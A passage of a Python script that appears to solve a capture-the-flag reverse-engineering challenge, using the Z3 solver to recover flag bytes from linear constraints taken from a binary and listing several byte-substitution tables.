                           + 93 * a1[14] \
                           + 183 * a1[15] \
                           + 156 * a1[12] \
                           + 197 * a1[8] \
                           + 119 * a1[13] \
                           + 36 * a1[10] \
                           + 205 * a1[2] \
                           + 94 * a1[9] \
                           + 153 * a1[5])&amp;0xffffffff)
s.add(dword_422040[5] == (9 * a1[4] \
                          + ((a1[5] &lt;&lt; 6)&amp;0xffffffff) \
                          + 62 * a1[1] \
                          + 58 * a1[7] \
                          + 100 * a1[13] \
                          + 137 * a1[11] \
                          + 6 * a1[0] \
                          + 119 * a1[9] \
                          + 180 * a1[6] \
                          + 228 * a1[8] \
                          + 88 * a1[12] \
                          + 107 * a1[15] \
                          + 56 * a1[14] \
                          + 207 * a1[2] \
                          + 248 * a1[10] \
                          + 150 * a1[3])&amp;0xffffffff)
s.add(dword_422040[3] == (38 * a1[7] \
                          + 194 * a1[4] \
                          + 105 * a1[0] \
                          + 150 * a1[6] \
                          + 75 * a1[1] \
                          + 89 * a1[15] \
                          + 99 * a1[14] \
                          + 98 * a1[3] \
                          + 91 * a1[8] \
                          + 178 * a1[12] \
                          + 117 * a1[2] \
                          + 48 * a1[13] \
                          + 239 * a1[10] \
                          + 233 * a1[11] \
                          + 63 * a1[5]  \
                          + 250 * a1[9])&amp;0xffffffff)
s.add(dword_422040[11] == (30 * a1[8] \
                           + 13 * a1[5] \
                           + 206 * a1[3] \
                           + 234 * a1[15] \
                           + 71 * a1[7] \
                           + 239 * a1[12] \
                           + 141 * a1[10] \
                           + 179 * a1[13] \
                           + 113 * a1[14] \
                           + 181 * a1[9] \
                           + 52 * a1[6] \
                           + 74 * a1[11] \
                           + 168 * a1[4] \
                           + 239 * a1[1] \
                           + 164 * a1[0] \
                           + 179 * a1[2])&amp;0xffffffff)
s.add(dword_422040[14] == (211 * a1[1] \
                           + 74 * a1[5] \
                           + 144 * a1[8] \
                           + 234 * a1[0] \
                           + 241 * a1[2] \
                           + 157 * a1[11] \
                           + 25 * a1[15] \
                           + 6 * a1[10] \
                           + 243 * a1[6] \
                           + 107 * a1[9] \
                           + 77 * a1[12] \
                           + 127 * a1[4] \
                           + 67 * a1[7] \
                           + 13 * a1[14] \
                           + 151 * a1[3]  \
                           + 127 * a1[13])&amp;0xffffffff)
s.add(dword_422040[2] == (209 * a1[9] \
                          + 110 * a1[7] \
                          + 22 * a1[10] \
                          + 102 * a1[11] \
                          + 187 * a1[1] \
                          + 58 * a1[8] \
                          + 236 * a1[6] \
                          + 146 * a1[13] \
                          + 205 * a1[15] \
                          + 63 * a1[2] \
                          + 211 * a1[4] \
                          + 152 * a1[3] \
                          + 82 * a1[14] \
                          + 14 * a1[5] \
                          + 49 * a1[12] \
                          + 251 * a1[0])&amp;0xffffffff)
s.add(dword_422040[12] == (230 * a1[0] \
                           + 27 * a1[3] \
                           + 186 * a1[10] \
                           + 58 * a1[7] \
                           + 121 * a1[1] \
                           + 59 * a1[14] \
                           + 90 * a1[12] \
                           + 40 * a1[2] \
                           + 230 * a1[11] \
                           + 25 * a1[6] \
                           + 198 * a1[5] \
                           + 81 * a1[4] \
                           + 71 * a1[13] \
                           + 180 * a1[8] \
                           + 149 * a1[9] \
                           + 73 * a1[15])&amp;0xffffffff)
s.add(dword_422040[4] == (188 * a1[5] \
                          + 80 * a1[1] \
                          + 221 * a1[6] \
                          + ((a1[12] &lt;&lt; 6)&amp;0xffffffff) \
                          + 230 * a1[3] \
                          + 123 * a1[8] \
                          + 124 * a1[11] \
                          + 253 * a1[0] \
                          + 202 * a1[10] \
                          + 63 * a1[2] \
                          + 40 * a1[7] \
                          + 109 * a1[9] \
                          + 195 * a1[15] \
                          + 199 * a1[13] \
                          + 82 * a1[4] \
                          + 225 * a1[14])&amp;0xffffffff)
s.add(dword_422040[1] == (236 * a1[15] \
                          + 44 * a1[14] \
                          + 214 * a1[13] \
                          + 52 * a1[8] \
                          + 37 * a1[6] \
                          + 101 * a1[9] \
                          + 244 * a1[10] \
                          + 238 * a1[11] \
                          + 109 * a1[0] \
                          + 188 * a1[1] \
                          + 20 * a1[3] \
                          + 87 * a1[7] \
                          + 93 * a1[4] \
                          + 158 * a1[5] \
                          + 105 * a1[12] \
                          + 3 * a1[2])&amp;0xffffffff)
assert s.check() == sat
print(s.model())
flag[28] = 114
flag[18] = 42
flag[21] = 71
flag[27] = 42
flag[30] = 124
flag[32] = 51
flag[23] = 42
flag[26] = 186
flag[31] = 209
flag[17] = 186
flag[24] = 186
flag[29] = 11
flag[20] = 45
flag[19] = 51
flag[22] = 51
flag[25] = 25
dword_422000 = [0x0002A81A, 0x00028D44, 0x00022653, 0x0002E993, 0x000249B5, 0x00024265, 0x0003253D, 0x0002D77B, 0x000282C8, 0x00022892, 0x0002BD54, 0x0002482E, 0x00024C1F, 0x00028127, 0x0001E62E, 0x0001F009]

x = Solver()
a1 = [BitVec(f&#39;flag[&#123;i&#125;]&#39;,8) for i in range(1,17)]
x.add(dword_422000[12] == (199 * a1[9] \
                       + 98 * a1[7] \
                       + 192 * a1[8] \
                       + 23 * a1[12] \
                       + 79 * a1[14] \
                       + 77 * a1[10] \
                       + 185 * a1[13] \
                       + 135 * a1[15] \
                       + 119 * a1[4] \
                           + 54 * a1[0] \
                           + 41 * a1[1] \
                       + 124 * a1[6] \
                       + 18 * a1[2] \
                       + 181 * a1[11] \
                       + 191 * a1[5] \
                       + 7 * a1[3])&amp;0xffffffff)
x.add(dword_422000[3] == (210 * a1[11] \
                      + 26 * a1[15] \
                      + 169 * a1[0] \
                      + 177 * a1[13] \
                      + a1[6] \
                      + 205 * a1[8] \
                      + 223 * a1[10] \
                      + 32 * a1[5] \
                      + 225 * a1[3] \
                      + 61 * a1[14] \
                      + 72 * a1[1] \
                      + 186 * a1[9] \
                      + 253 * a1[12] \
                      + 205 * a1[2] \
                      + 49 * a1[4] \
                      + 232 * a1[7])&amp;0xffffffff)
x.add(dword_422000[13] == (192 * a1[3] \
                       + 22 * a1[10] \
                       + 175 * a1[1] \
                       + 184 * a1[7] \
                       + 116 * a1[15] \
                       + 70 * a1[13] \
                       + 153 * a1[14] \
                       + 119 * a1[0] \
                       + 217 * a1[6] \
                       + 123 * a1[5] \
                       + 17 * a1[2] \
                       + 244 * a1[12] \
                       + 116 * a1[8] \
                       + 46 * a1[4] \
                       + 19 * a1[9] \
                       + 130 * a1[11])&amp;0xffffffff)
x.add(dword_422000[7] == (41 * a1[12] \
                      + 71 * a1[7] \
                      + 185 * a1[1] \
                      + 69 * a1[11] \
                      + 142 * a1[8] \
                      + 221 * a1[5] \
                      + 24 * a1[3] \
                      + 208 * a1[6] \
                      + 41 * a1[9] \
                      + 159 * a1[2] \
                      + 231 * a1[14] \
                      + 235 * a1[13] \
                      + 225 * a1[0] \
                      + (a1[4] &lt;&lt; 6) \
                      + 162 * a1[10] \
                      + 134 * a1[15])&amp;0xffffffff)
x.add(dword_422000[11] == (36 * a1[12] \
                       + 220 * a1[4] \
                       + 110 * a1[13] \
                       + 45 * a1[7] \
                       + 123 * a1[9] \
                       + 133 * a1[1] \
                       + 101 * a1[5] \
                       + 137 * a1[10] \
                       + 102 * a1[0] \
                           + 227 * a1[14] \
                       + 94 * a1[15] \
                       + 18 * a1[2] \
                       + 22 * a1[6] \
                       + 189 * a1[11] \
                       + 218 * a1[8])&amp;0xffffffff)
x.add(dword_422000[15] == (86 * a1[11] \
                       + 31 * a1[9] \
                       + 229 * a1[6] \
                       + 27 * a1[3] \
                       + 6 * a1[12] \
                       + 13 * a1[10] \
                       + 158 * a1[1] \
                       + 89 * a1[7] \
                       + 35 * a1[15] \
                       + 126 * a1[8] \
                       + 165 * a1[13] \
                       + 220 * a1[0] \
                       + 138 * a1[5] \
                       + 100 * a1[4] \
                       + 84 * a1[14] \
                       + 175 * a1[2])&amp;0xffffffff)
x.add(dword_422000[8] == (7 * a1[1] \
                      + 28 * a1[8] \
                      + 131 * a1[10] \
                      + 6 * a1[6] \
                      + 254 * a1[0] \
                      + 130 * a1[13] \
                      + 124 * a1[3] \
                      + 55 * a1[12] \
                      + 157 * a1[14] \
                      + 175 * a1[5] \
                      + 140 * a1[4] \
                      + 241 * a1[9] \
                      + 11 * a1[11] \
                      + 211 * a1[2] \
                      + 121 * a1[7] \
                      + 200 * a1[15])&amp;0xffffffff)
x.add(dword_422000[6] == (195 * a1[14] \
                      + 197 * a1[13] \
                      + 218 * a1[7] \
                      + 83 * a1[1] \
                      + 98 * a1[2] \
                      + 70 * a1[10] \
                      + 229 * a1[15] \
                      + 148 * a1[11] \
                      + 195 * a1[0] \
                      + 94 * a1[6] \
                      + 211 * a1[12] \
                      + 220 * a1[9] \
                      + 81 * a1[5] \
                      + 253 * a1[8] \
                      + 78 * a1[4] \
                      + 4 * a1[3])&amp;0xffffffff)
x.add(dword_422000[14] == (3 * a1[4] \
                       + 136 * a1[7] \
                       + 156 * a1[3] \
                       + 189 * a1[1] \
                       + 244 * a1[12] \
                       + 157 * a1[15] \
                       + 83 * a1[9] \
                       + 6 * a1[0] \
                       + 113 * a1[6] \
                       + 63 * a1[14] \
                       + 35 * a1[2] \
                       + 22 * a1[8] \
                       + 26 * a1[10] \
                       + 62 * a1[11] \
                       + 98 * a1[5] \
                       + 110 * a1[13])&amp;0xffffffff)
x.add(dword_422000[4] == (96 * a1[4] \
                      + 248 * a1[8] \
                      + 191 * a1[9] \
                      + 194 * a1[2] \
                      + 154 * a1[1] \
                      + 31 * a1[6] \
                      + 157 * a1[7] \
                      + 248 * a1[13] \
                      + 81 * a1[15] \
                      + 56 * a1[10] \
                      + 52 * a1[0] \
                      + 94 * a1[12] \
                      + 212 * a1[5] \
                      + 83 * a1[3] \
                      + 83 * a1[14] \
                      + 158 * a1[11])&amp;0xffffffff)
x.add(dword_422000[1] == (67 * a1[4] \
                      + 220 * a1[2] \
                      + 123 * a1[11] \
                      + 168 * a1[5] \
                      + 23 * a1[12] \
                      + 148 * a1[7] \
                      + 127 * a1[10] \
                      + 194 * a1[1] \
                      + 132 * a1[8] \
                      + 44 * a1[0] \
                      + 60 * a1[13] \
                      + 98 * a1[15] \
                      + 38 * a1[14] \
                      + 245 * a1[9] \
                      + 159 * a1[6] \
                      + 146 * a1[3])&amp;0xffffffff)
x.add(dword_422000[5] == (132 * a1[3] \
                           + 10 * a1[7] \
                      + 95 * a1[0] \
                      + 83 * a1[10] \
                      + 99 * a1[1] \
                      + 77 * a1[12] \
                      + 195 * a1[2] \
                      + 47 * a1[6] \
                      + 38 * a1[13] \
                      + 178 * a1[8] \
                      + 74 * a1[4] \
                      + 86 * a1[11] \
                      + 208 * a1[9] \
                      + 240 * a1[14] \
                      + 120 * a1[5] \
                      + 43 * a1[15])&amp;0xffffffff)
x.add(dword_422000[9] == (172 * a1[1] \
                      + 110 * a1[2] \
                      + 92 * a1[7] \
                      + 126 * a1[15] \
                      + 91 * a1[0] \
                      + 77 * a1[6] \
                      + 207 * a1[5] \
                      + 249 * a1[11] \
                      + 240 * a1[12] \
                      + 129 * a1[10] \
                      + 6 * a1[13] \
                      + 100 * a1[3] \
                      + a1[14] \
                      + 76 * a1[9] \
                      + 127 * a1[4] \
                      + 4 * a1[8])&amp;0xffffffff)
x.add(dword_422000[10] == (46 * a1[15] \
                       + 37 * a1[0] \
                       + 3 * a1[3] \
                       + 72 * a1[6] \
                       + 116 * a1[7] \
                       + 186 * a1[1] \
                       + 221 * a1[14] \
                       + 236 * a1[4] \
                       + 79 * a1[2] \
                       + 175 * a1[10] \
                       + 184 * a1[9] \
                       + 160 * a1[11] \
                       + 227 * a1[12] \
                       + 99 * a1[8] \
                       + 71 * a1[13] \
                       + 4 * a1[5])&amp;0xffffffff)
x.add(dword_422000[0] == (203 * a1[3] \
                      + 31 * a1[0] \
                      + 11 * a1[14] \
                      + 149 * a1[7] \
                      + 215 * a1[5] \
                      + 206 * a1[1] \
                      + 245 * a1[6] \
                      + 9 * a1[11] \
                      + 16 * a1[10] \
                      + 241 * a1[13] \
                      + 110 * a1[8] \
                      + 175 * a1[2] \
                      + 38 * a1[4] \
                      + 227 * a1[9] \
                      + 208 * a1[12] \
                      + 8 * a1[15])&amp;0xffffffff)
x.add(dword_422000[2] == (132 * a1[3] \
                      + 119 * a1[14] \
                      + 26 * a1[8] \
                      + 24 * a1[6] \
                      + 121 * a1[11] \
                      + 235 * a1[2] \
                      + 228 * a1[12] \
                      + 34 * a1[5] \
                      + 37 * a1[15] \
                      + 24 * a1[9] \
                      + 145 * a1[13] \
                      + 199 * a1[4] \
                      + 173 * a1[10] \
                      + 58 * a1[0] \
                      + 246 * a1[7] \
                      + 199 * a1[1])&amp;0xffffffff)
    
assert x.check() == sat
print(x.model())

flag[0] = 0x23
flag[33] = 0x21
flag[5] = 43
flag[11] = 186
flag[8] = 51
flag[16] = 72
flag[6] = 42
flag[4] = 51
flag[3] = 1
flag[10] = 179
flag[14] = 43
flag[7] = 186
flag[1] = 90
flag[13] = 113
flag[12] = 51
flag[2] = 45
flag[9] = 72
flag[15] = 114

by280 = [0x7A, 0x91, 0x9F, 0x23, 0x71, 0xD1, 0x63, 0xDB, 0x59, 0x0A, 0xEC, 0x69, 0xEE, 0x76, 0x5D, 0x64, 0x37, 0x42, 0x8C, 0x0B, 0x3C, 0x5C, 0x80, 0xAD, 0x6A, 0x03, 0x43, 0x93, 0xBC, 0xBF, 0xE3, 0xAF, 0x5A, 0x8A, 0x65, 0x0D, 0x31, 0xDF, 0x3E, 0xA7, 0xE4, 0xDD, 0xB4, 0xB0, 0x56, 0x1C, 0x12, 0xA4, 0x9E, 0xD8, 0x3D, 0x81, 0x60, 0x9A, 0xCB, 0xFA, 0xB1, 0xE0, 0xD3, 0xF4, 0xA2, 0x26, 0x68, 0x90, 0x4B, 0x45, 0x85, 0x20, 0x16, 0xDE, 0xED, 0x4C, 0x6F, 0x34, 0xDC, 0xBE, 0xD2, 0x46, 0x33, 0x14, 0x77, 0xC6, 0xCD, 0xF0, 0xC5, 0xAC, 0x1F, 0xD0, 0x95, 0x97, 0x3F, 0xD7, 0x52, 0xAE, 0xB9, 0xC9, 0x0C, 0xCA, 0x4E, 0xF1, 0xB7, 0x39, 0x7F, 0x27, 0x2B, 0x40, 0x4A, 0x51, 0xA1, 0xCC, 0xCE, 0x6E, 0x70, 0xFF, 0x0E, 0xEF, 0x8E, 0x25, 0xB3, 0x5E, 0x6C, 0xAB, 0x02, 0x49, 0xE9, 0x9B, 0x36, 0x13, 0x9C, 0x04, 0x35, 0xC0, 0xFB, 0x3A, 0x67, 0xB6, 0x9D, 0xC2, 0x73, 0xB5, 0x6D, 0xCF, 0x83, 0x2C, 0x01, 0xC1, 0x10, 0x6B, 0x79, 0x87, 0x5B, 0x57, 0x47, 0xE5, 0x15, 0xF7, 0xA5, 0x74, 0xAA, 0x53, 0x7D, 0x2E, 0xD5, 0xA3, 0x19, 0xF5, 0x2D, 0xFD, 0x61, 0x8D, 0xC8, 0x1B, 0xC3, 0xDA, 0xF6, 0x72, 0x54, 0x5F, 0x1E, 0xE8, 0x17, 0x50, 0xB2, 0xE7, 0x0F, 0x7E, 0x55, 0xBD, 0x86, 0x00, 0x78, 0x94, 0x92, 0x09, 0x2F, 0xD6, 0xD9, 0xF3, 0x29, 0xE6, 0x24, 0x32, 0x66, 0x22, 0x41, 0xC4, 0x7C, 0x05, 0x98, 0x44, 0x4F, 0x99, 0xA9, 0xE1, 0x8F, 0x08, 0x1A, 0x2A, 0x11, 0xEA, 0x3B, 0xE2, 0x38, 0xB8, 0x18, 0xF9, 0xD4, 0xC7, 0x62, 0x7B, 0x75, 0x58, 0x96, 0x28, 0xEB, 0x06, 0x84, 0x89, 0x48, 0x82, 0x88, 0xA6, 0xFE, 0xA0, 0xF2, 0xF8, 0x1D, 0x8B, 0xFC, 0xA8, 0x21, 0x30, 0xBB, 0x07, 0xBA, 0x4D]
by380 = [0x45, 0x1F, 0x63, 0x81, 0xE6, 0xAD, 0x4F, 0xD3, 0xC0, 0x15, 0x69, 0x8F, 0x0D, 0x31, 0x0C, 0xB0, 0xF1, 0x2E, 0x98, 0xC1, 0xC2, 0x96, 0xB2, 0xEB, 0xBF, 0xDF, 0x17, 0xF4, 0x7F, 0xE5, 0x66, 0x73, 0xD8, 0x56, 0x46, 0x20, 0x9C, 0x77, 0x3D, 0x72, 0xA3, 0x91, 0x49, 0x68, 0x4C, 0x1E, 0xAE, 0x06, 0x7A, 0x94, 0xDD, 0x52, 0x55, 0x2C, 0xB8, 0x42, 0x79, 0xFE, 0x38, 0xEF, 0x8B, 0xF7, 0xAC, 0xDC, 0xFF, 0x78, 0x34, 0x70, 0xA9, 0xCE, 0x3F, 0x0E, 0x11, 0x43, 0x5B, 0xF8, 0xAF, 0xD0, 0xFA, 0x33, 0xBA, 0xCF, 0x4A, 0xC9, 0x88, 0x4E, 0x80, 0x10, 0x85, 0x37, 0x12, 0xAB, 0xE1, 0x61, 0xB7, 0x3E, 0x4D, 0x19, 0x3A, 0x04, 0x8C, 0x92, 0x0B, 0xE7, 0x3C, 0xEA, 0xC7, 0x16, 0x35, 0xB1, 0xA7, 0x8E, 0x40, 0x9F, 0xB6, 0xB5, 0x25, 0xA0, 0x5A, 0x30, 0x7D, 0xA2, 0x1A, 0x64, 0xC5, 0x6D, 0x74, 0x82, 0x08, 0x7E, 0xD2, 0xF6, 0xAA, 0xDA, 0xED, 0x4B, 0x6E, 0xE8, 0xE9, 0xE2, 0xD4, 0x71, 0xB9, 0x09, 0x84, 0x3B, 0xC4, 0x1C, 0x60, 0xFD, 0x22, 0x99, 0x39, 0x97, 0x18, 0x89, 0x7C, 0xA4, 0x27, 0xBD, 0x0F, 0xCC, 0x95, 0xF5, 0xB3, 0x65, 0x6B, 0x8A, 0x58, 0x36, 0xBB, 0x9E, 0x75, 0xD1, 0x03, 0x9D, 0x6A, 0x6C, 0x53, 0x05, 0xB4, 0xE4, 0xEE, 0x67, 0x87, 0x7B, 0x32, 0x2D, 0x24, 0x2A, 0x59, 0xEC, 0x0A, 0xDB, 0x21, 0x07, 0x23, 0x50, 0x02, 0x41, 0xF2, 0x83, 0xD9, 0x26, 0xBC, 0x6F, 0x86, 0xA6, 0x93, 0xF9, 0xC8, 0xD6, 0xA5, 0x1D, 0xE3, 0xE0, 0xFC, 0xCA, 0x1B, 0x5E, 0x8D, 0x2F, 0x5C, 0xBE, 0x47, 0xA8, 0x44, 0x57, 0x54, 0x48, 0xC3, 0x00, 0x62, 0x5D, 0xCB, 0xD7, 0x76, 0xCD, 0x28, 0xD5, 0x14, 0x90, 0x13, 0xDE, 0x5F, 0xF0, 0x01, 0x2B, 0xC6, 0x29, 0x9A, 0x9B, 0x51, 0xF3, 0xFB, 0xA1]
by580 = [0x00, 0x74, 0x59, 0xC6, 0xAC, 0xD3, 0xC1, 0xA0, 0x88, 0x3F, 0x1C, 0x28, 0x17, 0x22, 0xC5, 0x38, 0xF9, 0x1B, 0x21, 0x49, 0x99, 0xAF, 0xD6, 0x95, 0xA4, 0x9D, 0x5D, 0x5B, 0x73, 0xFE, 0xC9, 0x9A, 0x4C, 0xB4, 0x27, 0x5E, 0x71, 0x25, 0xE2, 0x90, 0xC0, 0x62, 0x5F, 0x48, 0x77, 0xE0, 0xF2, 0x8E, 0x40, 0xC7, 0x79, 0x1A, 0xDC, 0xF3, 0x01, 0xB6, 0xD8, 0xB5, 0x67, 0x1E, 0x85, 0x12, 0x68, 0x87, 0xD0, 0x30, 0xEB, 0x2F, 0x50, 0xCF, 0xEE, 0xDD, 0xFB, 0xE6, 0xA5, 0x69, 0x05, 0x75, 0xB7, 0xEF, 0x70, 0x53, 0xFF, 0xBA, 0x80, 0x41, 0x9B, 0xA1, 0x39, 0xF8, 0x65, 0x1F, 0x7A, 0x51, 0x98, 0xAD, 0x02, 0x13, 0x18, 0xC3, 0x31, 0x89, 0xCD, 0xCA, 0x91, 0xD1, 0x78, 0x57, 0x47, 0xB8, 0x54, 0x9F, 0x96, 0x04, 0x23, 0x2B, 0xE5, 0x46, 0x29, 0x7C, 0x76, 0x82, 0xBC, 0xFC, 0x6E, 0xEC, 0xED, 0x64, 0x4A, 0x26, 0x34, 0x5C, 0x19, 0x55, 0xFD, 0x6D, 0xFA, 0x7E, 0xB2, 0xD4, 0xF1, 0xF6, 0xE4, 0x60, 0xB0, 0x52, 0x9E, 0x8F, 0xBB, 0x08, 0x3B, 0x97, 0xE8, 0x10, 0x6C, 0x44, 0x3A, 0x36, 0x35, 0x03, 0xC4, 0x81, 0x9C, 0xAB, 0xCB, 0x66, 0xAA, 0x37, 0xA2, 0xD2, 0xE1, 0xE9, 0x7B, 0x14, 0x8D, 0xD9, 0xF5, 0x0B, 0xC2, 0x07, 0xA8, 0x0D, 0xA3, 0x0A, 0x84, 0x6B, 0x2C, 0xEA, 0x0C, 0xAE, 0x7D, 0x6F, 0xD7, 0xE7, 0xC8, 0x3C, 0x45, 0xCC, 0x58, 0xB9, 0x3D, 0x33, 0x4E, 0x4B, 0x8C, 0xCE, 0x72, 0x6A, 0x8B, 0x2D, 0x24, 0x11, 0xDF, 0x5A, 0x2E, 0x92, 0xDA, 0x86, 0x94, 0xA7, 0xD5, 0x4F, 0x2A, 0xB3, 0x63, 0x61, 0xE3, 0xDE, 0x43, 0x1D, 0xBF, 0x15, 0x32, 0xBE, 0x16, 0x3E, 0x93, 0x7F, 0x83, 0x56, 0x06, 0xF7, 0x8A, 0x20, 0xBD, 0x0E, 0xA6, 0xDB, 0x0F, 0xB1, 0x42, 0xF0, 0x09, 0x4D, 0xA9, 0xF4]
by780 = [0x0F, 0xA5, 0xBA, 0x03, 0xF9, 0x69, 0x2A, 0xD7, 0xEA, 0xB5, 0xFC, 0xA1, 0x39, 0x20, 0x68, 0x72, 0x25, 0xB2, 0x6C, 0xAD, 0x88, 0x51, 0x73, 0xEB, 0xCF, 0x13, 0xDE, 0x7C, 0x6D, 0x38, 0x05, 0x09, 0xC2, 0x96, 0x1F, 0x7F, 0x37, 0x4A, 0xC9, 0xE7, 0x6A, 0xB0, 0x59, 0xF7, 0xD2, 0xB9, 0x16, 0xC8, 0xEE, 0xA9, 0x18, 0x80, 0xAC, 0xE3, 0x9E, 0x6F, 0x3C, 0x2F, 0x3E, 0x9A, 0xBE, 0x1D, 0xB4, 0x7B, 0x7D, 0x32, 0x6B, 0x74, 0xC5, 0xC0, 0xC7, 0xD1, 0x29, 0x98, 0xDD, 0xB6, 0x0E, 0x4D, 0xBF, 0x79, 0x0D, 0xDA, 0x7A, 0x17, 0x71, 0x43, 0x87, 0xFF, 0xDC, 0xC6, 0x12, 0xE9, 0x67, 0x2D, 0x70, 0x9F, 0x95, 0x30, 0x26, 0x24, 0x2B, 0xA8, 0xA2, 0xD8, 0x3B, 0x31, 0xA0, 0x3D, 0x4B, 0x90, 0x60, 0x34, 0x75, 0xE8, 0x5D, 0xF4, 0x85, 0xF3, 0xFE, 0x35, 0xCB, 0xB8, 0x02, 0x50, 0xB1, 0xF1, 0x1A, 0x1B, 0x21, 0xCD, 0xC4, 0x7E, 0xED, 0x07, 0xD9, 0xD6, 0x44, 0x15, 0x8E, 0x49, 0xB3, 0x97, 0xE6, 0x63, 0xB7, 0xEF, 0x3A, 0x8F, 0xF2, 0x53, 0x10, 0x77, 0x86, 0xF8, 0x8A, 0x28, 0x3F, 0xD4, 0x4C, 0xE5, 0x82, 0x83, 0xEC, 0x62, 0x89, 0xDF, 0xC3, 0x14, 0xCA, 0xA3, 0x5F, 0x64, 0x47, 0xFD, 0x00, 0x84, 0x66, 0xA7, 0x5A, 0x0C, 0x01, 0xD5, 0x5B, 0x0A, 0x4F, 0x27, 0x78, 0x0B, 0x2E, 0x48, 0x36, 0xFA, 0x08, 0x56, 0xE0, 0xA6, 0xC1, 0x5C, 0x8B, 0x41, 0x06, 0xBB, 0x52, 0x93, 0xAF, 0x2C, 0x5E, 0xF6, 0x61, 0xF0, 0xAB, 0x91, 0x45, 0x04, 0xBD, 0xCC, 0xE4, 0x65, 0x9D, 0x92, 0xCE, 0x40, 0xAE, 0x76, 0x9B, 0x9C, 0xAA, 0x54, 0xD0, 0x1C, 0x81, 0x4E, 0x57, 0x55, 0x23, 0x6E, 0x1E, 0x99, 0xDB, 0xFB, 0xA4, 0x22, 0x19, 0x58, 0x11, 0x8D, 0x94, 0xD3, 0xE2, 0x8C, 0xF5, 0x42, 0x46, 0xBC, 0x33, 0xE1]
byb80 = [0x38, 0xD9, 0xDA, 0xE6, 0xB5, 0xF1, 0x0B, 0x93, 0x0C, 0x58, 0x0D, 0xAE, 0x0A, 0x85, 0x2A, 0x50, 0xC2, 0xBF, 0xD4, 0x28, 0x52, 0xC4, 0x4F, 0xE1, 0x44, 0xE0, 0xA2, 0x70, 0x36, 0x65, 0x4B, 0x41, 0x9D, 0x5F, 0x05, 0x7C, 0xF7, 0xD7, 0x99, 0x8B, 0xCC, 0xCE, 0x16, 0xBE, 0xB6, 0xC5, 0x8F, 0x79, 0xC7, 0x20, 0x7E, 0xF4, 0xF3, 0x2E, 0x4A, 0x89, 0xD6, 0x0F, 0x6E, 0xB0, 0x61, 0xB1, 0x6D, 0x19, 0x73, 0x03, 0x74, 0xA1, 0x40, 0xEC, 0xC0, 0x57, 0x94, 0x7A, 0x66, 0xD5, 0xEA, 0x17, 0x6A, 0x84, 0x37, 0xED, 0xF6, 0x13, 0x31, 0x5B, 0x82, 0x1E, 0xFC, 0x92, 0xE2, 0x42, 0x86, 0xBA, 0xE3, 0x91, 0x7F, 0x67, 0x5C, 0x98, 0x15, 0x22, 0x8D, 0x80, 0x04, 0xE4, 0x25, 0x09, 0xA0, 0xAD, 0x63, 0xE5, 0xB4, 0x9A, 0x3C, 0xA3, 0x3A, 0x69, 0xF8, 0xCD, 0xBC, 0x88, 0x55, 0xB2, 0xBD, 0x6B, 0x77, 0x71, 0xB3, 0xD3, 0x90, 0x75, 0x06, 0x49, 0xC3, 0x32, 0x4D, 0x1D, 0xA8, 0xAA, 0xFB, 0x7B, 0x7D, 0x2B, 0xA6, 0x34, 0x72, 0x47, 0xF0, 0x2F, 0x9C, 0x08, 0x00, 0x14, 0x8C, 0x26, 0x5E, 0x87, 0xD1, 0xCF, 0xC9, 0x18, 0x51, 0x23, 0xCB, 0xF5, 0x1C, 0x9F, 0x97, 0xF9, 0xBB, 0xA7, 0x39, 0x45, 0x02, 0xFD, 0x46, 0x8A, 0x54, 0xA4, 0x8E, 0x9E, 0x68, 0x96, 0x0E, 0x78, 0xB8, 0x3D, 0x11, 0x64, 0xAF, 0x10, 0xDE, 0x6C, 0x60, 0x5A, 0x76, 0x1A, 0xE9, 0xC1, 0x3E, 0xCA, 0x9B, 0x27, 0x30, 0xEF, 0xFF, 0x07, 0xD2, 0xB9, 0x2D, 0xD0, 0xEE, 0x83, 0xAB, 0xF2, 0x4C, 0xA5, 0x21, 0x62, 0x81, 0x33, 0x1B, 0xD8, 0x6F, 0xAC, 0x3B, 0x5D, 0xE8, 0xFA, 0x3F, 0xDB, 0x95, 0xE7, 0x59, 0x12, 0x48, 0x35, 0xC6, 0x2C, 0x4E, 0x01, 0xDD, 0x43, 0x29, 0xDC, 0x24, 0x1F, 0xB7, 0xA9, 0xEB, 0xC8, 0xFE, 0x56, 0xDF, 0x53]
byd80 = [0xB0, 0x28, 0x0B, 0x89, 0x4B, 0xA4, 0xBE, 0x1A, 0x8F, 0x6C, 0xCF, 0xB2, 0xB5, 0xFE, 0xFB, 0x59, 0x2D, 0x29, 0x39, 0x62, 0x97, 0xAA, 0xD7, 0x7D, 0x94, 0x2C, 0xFC, 0x5D, 0xB4, 0x7C, 0x8A, 0x82, 0xD3, 0xA7, 0xBA, 0xDF, 0x21, 0xE6, 0xA2, 0xD0, 0xE8, 0xF0, 0x67, 0x3A, 0xB9, 0x98, 0xF9, 0xAE, 0xD1, 0x56, 0xD8, 0xCA, 0x10, 0xEA, 0x92, 0xA8, 0x75, 0x7E, 0x65, 0xA9, 0xAF, 0x51, 0xC9, 0x8E, 0xD4, 0x77, 0xE4, 0x49, 0x06, 0x61, 0x9E, 0x24, 0xD9, 0x9B, 0x11, 0x05, 0x1D, 0x96, 0x9A, 0xB1, 0xE0, 0x83, 0xE1, 0x1C, 0xCD, 0xF3, 0x38, 0xB3, 0x57, 0x50, 0xF4, 0xAC, 0xEB, 0x14, 0xA5, 0x46, 0xF6, 0x93, 0xAD, 0x7B, 0x30, 0xEF, 0x79, 0x17, 0x47, 0xDA, 0xC0, 0xDD, 0xDE, 0xDC, 0x5A, 0x76, 0x3B, 0x31, 0x0D, 0x0E, 0x86, 0xF1, 0x71, 0xFA, 0x0C, 0x00, 0xA3, 0xBF, 0x64, 0x37, 0x22, 0xD2, 0x69, 0x5C, 0xC6, 0x16, 0x9F, 0x5E, 0x7A, 0x1E, 0x27, 0x60, 0x6E, 0xF8, 0x8C, 0xEE, 0xC2, 0x74, 0x81, 0x8B, 0x33, 0x03, 0xBD, 0x2A, 0x0A, 0x68, 0x6B, 0x3F, 0x4C, 0xC3, 0x15, 0x04, 0x3D, 0x63, 0xF5, 0xAB, 0xCC, 0x3C, 0x53, 0x20, 0x66, 0xC4, 0xC1, 0x23, 0xE7, 0x25, 0x55, 0xC7, 0xED, 0xB7, 0xBC, 0xCB, 0x8D, 0x09, 0xCE, 0x52, 0xBB, 0xE2, 0xC5, 0xB6, 0x26, 0x12, 0x2F, 0x99, 0x58, 0x40, 0x6D, 0xA1, 0x3E, 0x48, 0x85, 0xA6, 0xF2, 0x0F, 0x43, 0x78, 0xB8, 0x01, 0xE5, 0xD5, 0x6F, 0x4E, 0xF7, 0x13, 0x42, 0xEC, 0x45, 0x2B, 0x4F, 0x36, 0xDB, 0x9C, 0xE3, 